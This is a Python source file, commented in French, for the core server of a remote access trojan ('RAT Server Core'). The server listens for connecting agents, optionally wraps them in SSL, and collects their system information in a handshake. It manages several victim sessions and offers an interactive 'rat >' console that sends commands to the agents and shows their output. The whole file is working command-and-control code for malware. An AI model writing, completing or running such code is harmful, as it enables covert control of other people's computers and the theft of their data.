"""
RAT Server Core - Serveur principal
Inspiré des architectures Aphrobyte et GUIShell
"""

import socket
import ssl
import threading
import json
import time
from typing import Dict, Optional
import logging

from server.core.session_manager import SessionManager
from server.core.command_handler import CommandHandler
from server.core.crypto import SSLContextManager
from server.utils.config import ServerConfig
from shared.protocol import Protocol, MessageType
from shared.exceptions import RATException

logger = logging.getLogger(__name__)

class RATServer:
    """Serveur RAT principal avec gestion multi-clients"""
    
    def __init__(self, config: ServerConfig):
        self.config = config
        self.running = False
        self.server_socket = None
        
        # Composants principaux
        self.session_manager = SessionManager()
        self.command_handler = CommandHandler(self.session_manager, config)
        self.ssl_manager = SSLContextManager(config) if config.USE_SSL else None
        
        # Threads
        self.accept_thread = None
        self.console_thread = None
        
    def start(self):
        """Démarre le serveur RAT"""
        logger.info("Initialisation du serveur RAT")
        
        try:
            self._setup_server_socket()
            self._start_threads()
            self._interactive_console()
            
        except Exception as e:
            logger.error(f"Erreur lors du démarrage: {e}")
            raise RATException(f"Échec du démarrage du serveur: {e}")
        finally:
            self.stop()
    
    def _setup_server_socket(self):
        """Configure et bind le socket serveur"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.config.HOST, self.config.PORT))
            self.server_socket.listen(self.config.MAX_CONNECTIONS)
            
            logger.info(f"Serveur en écoute sur {self.config.HOST}:{self.config.PORT}")
            print(f"[*] Listening on {self.config.PORT}...")
            
        except Exception as e:
            raise RATException(f"Impossible de créer le socket serveur: {e}")
    
    def _start_threads(self):
        """Démarre les threads principaux"""
        self.running = True
        
        # Thread d'acceptation des connexions
        self.accept_thread = threading.Thread(target=self._accept_connections)
        self.accept_thread.daemon = True
        self.accept_thread.start()
        
        logger.info("Threads démarrés avec succès")
    
    def _accept_connections(self):
        """Thread d'acceptation des nouvelles connexions"""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                logger.info(f"Nouvelle connexion depuis {address}")
                
                # Chiffrement SSL si activé
                if self.ssl_manager:
                    try:
                        client_socket = self.ssl_manager.wrap_client_socket(client_socket)
                        logger.debug("Connexion SSL sécurisée établie")
                    except Exception as e:
                        logger.error(f"Erreur SSL avec {address}: {e}")
                        client_socket.close()
                        continue
                
                # Création d'une nouvelle session
                session = self.session_manager.create_session(client_socket, address)
                
                # Thread pour gérer cette session
                session_thread = threading.Thread(
                    target=self._handle_session,
                    args=(session,)
                )
                session_thread.daemon = True
                session_thread.start()
                
                print(f"\n[+] Agent received from {address[0]}!")
                self._print_prompt()
                
            except OSError:
                if self.running:
                    logger.error("Erreur lors de l'acceptation de connexion")
                break
            except Exception as e:
                logger.error(f"Erreur inattendue lors de l'acceptation: {e}")
    
    def _handle_session(self, session):
        """Gère une session client"""
        try:
            # Handshake initial
            if not self._perform_handshake(session):
                return
            
            # Boucle de réception des messages
            while session.is_active:
                try:
                    data = session.socket.recv(self.config.BUFFER_SIZE)
                    if not data:
                        break
                    
                    # Décodage du message
                    try:
                        message = Protocol.decode_message(data)
                        self._process_client_message(session, message)
                    except json.JSONDecodeError:
                        logger.warning(f"Message malformé reçu de {session.id}")
                        
                except socket.timeout:
                    continue
                except ConnectionResetError:
                    logger.info(f"Connexion fermée par le client {session.id}")
                    break
                    
        except Exception as e:
            logger.error(f"Erreur dans la session {session.id}: {e}")
        finally:
            self.session_manager.remove_session(session.id)
            logger.info(f"Session {session.id} fermée")
    
    def _perform_handshake(self, session) -> bool:
        """Effectue le handshake initial avec le client"""
        try:
            # Attendre les informations système du client
            session.socket.settimeout(self.config.HANDSHAKE_TIMEOUT)
            data = session.socket.recv(self.config.BUFFER_SIZE)
            
            if not data:
                return False
                
            message = Protocol.decode_message(data)
            
            if message.get('type') == MessageType.SYSTEM_INFO:
                session.system_info = message.get('data', {})
                session.mark_as_authenticated()
                
                # Réponse de confirmation
                response = Protocol.create_message(
                    MessageType.HANDSHAKE_OK,
                    {'server_version': '1.0', 'timestamp': time.time()}
                )
                session.send_message(response)
                
                logger.info(f"Handshake réussi avec {session.id}")
                return True
                
        except Exception as e:
            logger.error(f"Erreur de handshake avec {session.address}: {e}")
        finally:
            session.socket.settimeout(None)
            
        return False
    
    def _process_client_message(self, session, message):
        """Traite un message reçu du client"""
        msg_type = message.get('type')
        
        if msg_type == MessageType.HEARTBEAT:
            session.update_last_seen()
        elif msg_type == MessageType.COMMAND_RESPONSE:
            # Affichage de la réponse à une commande
            self._display_command_response(session, message)
        elif msg_type == MessageType.ERROR:
            logger.warning(f"Erreur rapportée par {session.id}: {message.get('data')}")
        else:
            logger.debug(f"Message non géré de type {msg_type}")
    
    def _display_command_response(self, session, message):
        """Affiche la réponse à une commande"""
        if session.id == self.session_manager.current_session:
            data = message.get('data', {})
            output = data.get('output', 'Pas de sortie')
            status = data.get('status', 'unknown')
            
            if status == 'error':
                print(f"[!] Erreur: {output}")
            else:
                print(output)
            
            self._print_prompt()
    
    def _interactive_console(self):
        """Console interactive du serveur"""
        print("\n" + "="*50)
        print("RAT Server Console - Tapez 'help' pour l'aide")
        print("="*50)
        
        while self.running:
            try:
                if self.session_manager.current_session:
                    session = self.session_manager.get_session(
                        self.session_manager.current_session
                    )
                    if session:
                        prompt = f"rat {session.id} > "
                    else:
                        prompt = "rat > "
                        self.session_manager.current_session = None
                else:
                    prompt = "rat > "
                
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                self._process_console_command(command)
                
            except KeyboardInterrupt:
                print("\n[*] Utilise 'exit' pour quitter proprement")
            except EOFError:
                break
    
    def _process_console_command(self, command: str):
        """Traite une commande de la console"""
        try:
            result = self.command_handler.handle_command(command)
            if result:
                print(result)
        except Exception as e:
            print(f"[!] Erreur: {e}")
            logger.error(f"Erreur lors du traitement de '{command}': {e}")
    
    def _print_prompt(self):
        """Affiche le prompt approprié"""
        if self.session_manager.current_session:
            session = self.session_manager.get_session(
                self.session_manager.current_session
            )
            if session:
                print(f"rat {session.id} > ", end="", flush=True)
            else:
                print("rat > ", end="", flush=True)
        else:
            print("rat > ", end="", flush=True)
    
    def stop(self):
        """Arrête le serveur proprement"""
        logger.info("Arrêt du serveur en cours...")
        self.running = False
        
        # Fermeture de toutes les sessions
        self.session_manager.close_all_sessions()
        
        # Fermeture du socket serveur
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        logger.info("Serveur arrêté")